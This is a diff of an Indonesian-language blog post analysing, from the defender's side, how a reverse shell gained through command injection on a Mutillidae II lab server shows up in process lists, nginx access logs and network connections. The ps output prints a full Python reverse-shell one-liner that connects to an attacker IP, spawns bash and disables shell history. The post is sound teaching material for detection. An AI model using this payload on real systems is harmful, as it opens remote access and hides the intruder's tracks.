@@ -1,146 +1,289 @@
-# Reverse Shell: Proses - Log - Network 
+# Reverse Shell: Process, Log, and Network Analysis
 
 [🇬🇧 Read in English](reverse-shell-server-side-en.md)
 
+Halo semuanya,
 
+Pada artikel sebelumnya kita berhasil memperoleh **Reverse Shell** melalui kerentanan **Command Injection** pada aplikasi **Mutillidae II**.
 
-Pada [tulisan sebelumnya](https://imoon07.github.io/read.html?post=command-injection-reverse-shell&lang=en), saya membahas bagaimana reverse shell dieksekusi dari sisi attacker (Red Team). Kali ini saya ingin melihat proses yang sama dari perspektif server proses apa yang berjalan, log apa yang tercatat, dan koneksi jaringan apa yang terbentuk ketika reverse shell berhasil dijalankan.
+👉 **Artikel sebelumnya:**
+https://imoon07.github.io/read.html?post=command-injection-reverse-shell
 
-Tulisan ini merupakan catatan sederhana hasil pengamatan di lingkungan lab untuk memahami jejak yang ditinggalkan selama proses tersebut.
+Kali ini kita berpindah sudut pandang.
 
-Berangkat dari rasa penasaran, tulisan ini adalah catatan kecil saat saya mencoba memahami apa yang sebenarnya terjadi di balik layar (server) ketika reverse shell berhasil masuk.
+Bukan lagi sebagai **attacker**, melainkan sebagai administrator sistem atau security analyst yang ingin memahami jejak yang ditinggalkan ketika Reverse Shell berhasil dijalankan.
 
-## Flow: Apa yang Terjadi di Server?
+Artikel ini berfokus pada tiga artefak utama yang dapat diamati langsung dari sisi server:
+
+- Process
+- Log
+- Network
+
+---
+
+# Apa itu Reverse Shell Analysis?
+
+Reverse Shell Analysis adalah proses mengidentifikasi aktivitas Reverse Shell dari sisi server setelah payload berhasil dieksekusi.
+
+Alih-alih membahas cara membuat payload, artikel ini berfokus pada **apa yang terjadi di sistem** ketika sebuah Reverse Shell berhasil berjalan.
+
+Dengan memahami proses, log, dan koneksi jaringan yang terbentuk, kita dapat mengenali indikator aktivitas yang tidak normal serta memahami bagaimana sebuah serangan terlihat dari perspektif defender.
+
+---
+
+# Mengapa Penting?
+
+Ketika Reverse Shell berhasil dijalankan, server akan meninggalkan berbagai artefak yang dapat diamati, seperti:
+
+- Proses baru yang dijalankan oleh aplikasi web.
+- Log akses aplikasi yang merekam request dari attacker.
+- Koneksi jaringan keluar (*outbound connection*) menuju mesin attacker.
+
+Ketiga artefak tersebut saling melengkapi dan dapat digunakan sebagai dasar untuk melakukan investigasi maupun validasi insiden keamanan.
+
+---
+
+# Prasyarat
+
+Artikel ini merupakan lanjutan dari demonstrasi Reverse Shell sebelumnya.
+
+Pastikan Reverse Shell telah berhasil diperoleh terlebih dahulu melalui kerentanan **Command Injection**.
 
 ```text
-[ Browser Attacker ]
-        │ HTTPS Request
+Command Injection
+        │
         ▼
-[ Nginx (Port 443) ]
-        │ Forward Request
+Command Execution
+        │
         ▼
-[ PHP (www-data) ]
-        │ Command Injection
-        ▼
-[ Operating System ]
-        │ Execute Python
-        ▼
-[ Reverse Shell ]
-        │ Outbound Connection
-        ▼
-[ Host Attacker ]
+Reverse Shell
 ```
 
 ---
 
-Berikut adalah beberapa perintah bawaan Linux yang saya gunakan untuk melacak jejak serangan ini secara langsung:
+# Flow Investigasi
 
-### Proses
-
-Ketika serangan sedang berjalan, kita bisa melihat proses mencurigakan yang dieksekusi oleh *user* web server.
-
-```bash
-# Lihat proses aktif saat serangan berlangsung
-ps aux | grep -E 'python'
+```text
+            Reverse Shell
+                  │
+                  ▼
+        Process Investigation
+                  │
+                  ▼
+          Log Investigation
+                  │
+                  ▼
+       Network Investigation
 ```
 
-**Output**
+---
+
+# Topologi Lab
+
+| Peran | Keterangan | IP Address |
+| :--- | :--- | :--- |
+| **Attacker** | Kali Linux | `10.10.10.149` |
+| **Target** | Ubuntu Server (Mutillidae II) | `10.10.10.2` |
+
+---
+
+# Demonstrasi
+
+## 1. Investigasi Process
+
+Langkah pertama adalah melihat proses yang sedang berjalan pada server.
+
+```bash
+ps aux | grep python
+```
 
 ![Proses dari user www-data](proses-from-user-www-data.png)
+
+### Output
+
 ```text
 root         874  0.0  1.1 109688 23292 ?        Ssl  11:57   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
 www-data    3861  0.0  0.0   2800  1852 ?        S    16:13   0:00 sh -c -- nslookup google.com; python3 -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.149",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close();'
 www-data    3868  0.0  0.5  18648 11736 ?        S    16:13   0:00 python3 -c import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.149",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close();
-root        3886  0.0  0.1   6544  2328 pts/4    S+   16:18   0:00 grep --color=auto -E python
 ```
 
-Terlihat jelas *user* `www-data` (yang seharusnya hanya menjalankan *service* web) malah menjalankan perintah mencurigakan: `nslookup google.com; python3 -c 'import os,pty...`. Hal ini mengonfirmasi adanya eksekusi *Command Injection* yang dilanjutkan dengan membuka *reverse shell* ke IP `10.10.10.149` port `9001` (PID 3861 & 3868). Ini adalah *red flag* besar.
+### Apa yang ditemukan?
 
-### Log
+Terlihat bahwa proses `python3` dijalankan oleh user **www-data**, yaitu akun yang umumnya digunakan oleh web server seperti Apache atau Nginx.
 
-Setiap request yang masuk ke Nginx pasti tercatat di `access.log`. Kita bisa memantau *endpoint* mana yang diserang.
+Selain itu terlihat pula payload:
 
-![Command Injection Web](Command-injection.png)
-
-```bash
-# Log Nginx (request client masuk dari attacker)
-tail -f /var/log/nginx/access.log
-```
-
-**Output**
-
-![Log Nginx](log-nginx.png)
 ```text
-10.10.10.149 - - [26/Jun/2026:16:10:05 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8771 "https://mutillidae.owasp.hacking/index.php?page=dns-lookup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
-10.10.10.149 - - [26/Jun/2026:16:10:55 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8773 "https://mutillidae.owasp.hacking/index.php?page=dns-lookup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
-10.10.10.149 - - [26/Jun/2026:16:14:15 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 504 176 "https://mutillidae.owasp.hacking/index.php?page=dns-lookup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+nslookup google.com;
+python3 -c ...
 ```
 
-Log ini menunjukkan ada *request* POST berulang kali ke halaman `/index.php?page=dns-lookup.php` dari IP *attacker* (`10.10.10.149`). Hal ini sangat sinkron dengan log proses sebelumnya, di mana *attacker* menyalahgunakan fitur *DNS Lookup* (terlihat dari kata `nslookup google.com` pada payload) untuk menyisipkan *Command Injection*.
+### Apa arti output tersebut?
 
-### Network
+Normalnya akun `www-data` hanya menjalankan aplikasi web.
 
-Karakteristik paling kuat dari *reverse shell* adalah koneksi jaringan yang keluar (*outbound connection*) dari server menuju mesin *attacker*.
+Apabila akun tersebut menjalankan interpreter seperti **Python**, **Bash**, **Perl**, atau bahasa lainnya yang membuka koneksi keluar, kondisi ini dapat menjadi indikator adanya **Command Injection** maupun **Remote Code Execution (RCE)**.
 
-```bash
-# Lihat koneksi aktif keluar (reverse shell)
-ss -tnp
-```
-
-**Output**
-
-![State Active Open Port](state-active-open-port.png)
-```text
-State         Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
-...
-ESTAB         0         0               10.10.10.2:49342       10.10.10.149:9001     users:(("python3",pid=3868,fd=3),("python3",pid=3868,fd=2),("python3",pid=3868,fd=1),("python3",pid=3868,fd=0))
-...
-```
-
-Terlihat koneksi yang berstatus `ESTAB` (Established) dari IP server kita (`10.10.10.2`) menuju IP Attacker di port `9001`. Koneksi ilegal ini diinisiasi oleh proses `python3` (PID 3868), persis seperti temuan pada pengecekan log proses di tahap awal.
-
-```bash
-# Capture traffic saat serangan
-sudo tcpdump -i any port 9001 -nn -A -l
-```
-
-**Output**
-
-![Network tcpdump](network-tcpdump.png)
-```text
-16:13:15.687717 ens33 Out IP 10.10.10.2.49342 > 10.10.10.149.9001: Flags [P.], seq 1:49, ack 1, win 502, options [nop,nop,TS val 1701540689 ecr 1928400169], length 48
-E..d..@.@..5
-
-
-.
-
-
-...#).....#......)......
-eksQr..)www-data@server01:/var/www/hack/mutillidae/src$
-```
-
-Karena traffic *shell* ini berjalan polos tanpa enkripsi, kita bisa membaca komunikasi data secara *plaintext* lewat *packet capture*. Di atas terlihat jelas muncul *shell prompt* `www-data@server01:/var/www/hack/mutillidae/src$`, membuktikan bahwa *attacker* telah sukses mendapatkan akses terminal secara interaktif di dalam server.
+Pada demonstrasi ini proses Python menjadi artefak pertama yang menunjukkan aktivitas Reverse Shell.
 
 ---
 
-Proses investigasi sederhana ini mengajarkan saya banyak hal. Saya bisa melihat langsung *flow* dari proses apa saja yang dieksekusi, log apa yang terekam di sistem, hingga wujud koneksi *traffic* di server target. Hal ini membuat saya semakin penasaran untuk bereksplorasi lebih dalam lagi di sisi pertahanan (*defense*).
+## 2. Investigasi Log
 
-## Referensi
+Langkah berikutnya adalah melihat request yang diterima oleh web server.
 
-**Tools & Utility:**
-- [tcpdump](https://www.tcpdump.org) — Network packet capture & analysis
-- [ss](https://man7.org/linux/man-pages/man8/ss.8.html) — Socket statistics (pengganti netstat pada Linux modern)
-- [ps](https://man7.org/linux/man-pages/man1/ps.1.html) — Process monitoring
-- [tail](https://man7.org/linux/man-pages/man1/tail.1.html) — Real-time log monitoring
-- [grep](https://man7.org/linux/man-pages/man1/grep.1.html) — Filtering output log dan process
+```bash
+tail -f /var/log/nginx/access.log
+```
 
-**Dokumentasi Resmi:**
-- [Nginx Documentation: Access Log](https://nginx.org/en/docs/http/ngx_http_log_module.html)
-- [Python Documentation: socket module](https://docs.python.org/3/library/socket.html)
-- [Python Documentation: pty module](https://docs.python.org/3/library/pty.html)
+![Command Injection](Command-injection.png)
 
-**Klasifikasi MITRE ATT&CK:**
-- [T1059: Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
-- [T1059.006: Python](https://attack.mitre.org/techniques/T1059/006/)
+![Log Nginx](log-nginx.png)
 
-Terima kasih membaca tulisan ini!
+### Output
+
+```text
+10.10.10.149 - - [26/Jun/2026:16:10:05 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8771
+10.10.10.149 - - [26/Jun/2026:16:10:55 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8773
+10.10.10.149 - - [26/Jun/2026:16:14:15 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 504 176
+```
+
+### Apa yang ditemukan?
+
+Terlihat beberapa request **HTTP POST** menuju endpoint:
+
+```text
+/index.php?page=dns-lookup.php
+```
+
+yang berasal dari IP attacker.
+
+### Apa arti output tersebut?
+
+Request tersebut menunjukkan bahwa attacker berulang kali mengakses fitur **DNS Lookup** yang memiliki kerentanan **Command Injection**.
+
+Meskipun access log tidak menampilkan payload secara lengkap, informasi seperti alamat IP, endpoint, metode HTTP, dan waktu akses sudah cukup untuk dikorelasikan dengan proses Python yang ditemukan sebelumnya.
+
+---
+
+## 3. Investigasi Network
+
+Karakteristik utama Reverse Shell adalah terbentuknya koneksi keluar (*outbound connection*) dari server menuju mesin attacker.
+
+Periksa menggunakan perintah berikut.
+
+```bash
+ss -tnp
+```
+
+![State Active Open Port](state-active-open-port.png)
+
+### Output
+
+```text
+State      Recv-Q Send-Q Local Address:Port    Peer Address:Port
+ESTAB      0      0      10.10.10.2:49342      10.10.10.149:9001
+users:(("python3",pid=3868,fd=3))
+```
+
+### Apa yang ditemukan?
+
+Terlihat koneksi dengan status **ESTABLISHED** menuju alamat IP attacker pada port **9001**.
+
+Koneksi tersebut dibuat oleh proses **python3** dengan PID **3868**.
+
+### Apa arti output tersebut?
+
+Informasi ini mengonfirmasi bahwa proses Python yang ditemukan sebelumnya memang membuka koneksi keluar menuju mesin attacker.
+
+Korelasi antara **PID**, **proses**, dan **koneksi jaringan** memberikan bukti kuat bahwa Reverse Shell sedang aktif.
+
+---
+
+Apabila ingin melihat komunikasi jaringan secara langsung, gunakan:
+
+```bash
+sudo tcpdump -i any port 9001 -nn -A
+```
+
+![Network tcpdump](network-tcpdump.png)
+
+### Output
+
+```text
+16:13:15.687717 ens33 Out IP 10.10.10.2.49342 > 10.10.10.149.9001
+
+www-data@server01:/var/www/hack/mutillidae/src$
+```
+
+### Apa yang ditemukan?
+
+Terlihat komunikasi TCP menuju mesin attacker beserta shell prompt:
+
+```text
+www-data@server01:/var/www/hack/mutillidae/src$
+```
+
+### Apa arti output tersebut?
+
+Karena Reverse Shell pada demonstrasi ini menggunakan koneksi TCP tanpa enkripsi, isi komunikasi masih dapat dibaca dalam bentuk **plaintext**.
+
+Kemunculan shell prompt menunjukkan bahwa attacker telah berhasil memperoleh shell interaktif pada server target.
+
+---
+
+# Ringkasan Temuan
+
+| Artefak | Temuan |
+| :--- | :--- |
+| **Process** | `python3` dijalankan oleh user `www-data` |
+| **Log** | Request HTTP POST menuju endpoint `dns-lookup.php` |
+| **Network** | Koneksi keluar menuju IP attacker pada port `9001` |
+
+Ketiga artefak tersebut saling melengkapi dan memberikan gambaran yang jelas mengenai aktivitas Reverse Shell tanpa memerlukan tools forensik yang kompleks.
+
+---
+
+# Apa Langkah Selanjutnya?
+
+Setelah memahami artefak yang ditinggalkan oleh Reverse Shell, langkah berikutnya adalah melakukan **Linux Enumeration** untuk mengidentifikasi kondisi sistem yang telah berhasil diakses.
+
+Tahap ini meliputi:
+
+- Identifikasi pengguna aktif.
+- Informasi sistem operasi dan kernel.
+- Struktur direktori aplikasi.
+- Konfigurasi jaringan.
+- Service dan proses yang berjalan.
+
+---
+
+# Kesimpulan
+
+Reverse Shell tidak hanya memberikan akses kepada attacker, tetapi juga meninggalkan berbagai jejak pada sistem target.
+
+Melalui pemeriksaan **proses**, **log aplikasi**, dan **koneksi jaringan**, administrator sistem maupun security analyst dapat memahami bagaimana payload dijalankan serta bagaimana koneksi Reverse Shell terbentuk.
+
+Meskipun demonstrasi ini dilakukan pada lingkungan lab yang sederhana, pendekatan investigasi yang sama dapat diterapkan sebagai dasar analisis insiden pada sistem Linux.
+
+---
+
+# Referensi
+
+- MITRE ATT&CK – T1059: Command and Scripting Interpreter  
+  https://attack.mitre.org/techniques/T1059/
+
+- Nginx Documentation – Access Log  
+  https://nginx.org/en/docs/http/ngx_http_log_module.html
+
+- Linux Manual Pages  
+  https://man7.org/linux/man-pages/
+
+- tcpdump Documentation  
+  https://www.tcpdump.org/
+
+---
+
+Terima kasih sudah membaca.
+
+Semoga tulisan ini dapat membantu memahami bagaimana Reverse Shell terlihat dari sisi server serta bagaimana proses investigasi sederhana dapat dilakukan menggunakan utilitas bawaan Linux.
